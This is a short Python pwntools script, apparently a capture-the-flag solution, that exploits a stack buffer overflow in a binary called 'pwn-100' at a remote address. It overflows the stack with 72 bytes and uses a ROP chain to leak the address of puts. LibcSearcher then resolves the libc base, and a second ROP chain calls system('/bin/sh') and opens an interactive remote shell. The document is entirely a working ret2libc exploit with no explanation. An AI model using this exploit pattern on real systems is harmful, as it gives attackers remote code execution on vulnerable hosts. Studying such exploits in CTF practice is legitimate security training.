from pwn import *
from LibcSearcher import *

context(log_level="debug", arch="amd64", os="linux")
elf = ELF("./pwn-100")
# r = process("./pwn-100")
r = remote("61.147.171.105", 50734)
main = 0x4006b8

rop1 = ROP(elf)
rop1.call("puts", [elf.got["puts"]])
rop1.raw(main)
payload1 = (cyclic(72) + rop1.chain()).ljust(200, b"\x00")
r.send(payload1)
r.recvline()
puts = u64(r.recv()[0:6] + b"\x00\x00")
log.debug("puts: " + hex(puts))
libc = LibcSearcher("puts", puts)
libc_base = puts - libc.dump("puts")
system = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")
rop2 = ROP(elf)
rop2.call(system, [bin_sh])
payload2 = cyclic(72) + rop2.chain()
payload2 = payload2.ljust(200, b"\x00")
r.send(payload2)
r.interactive()
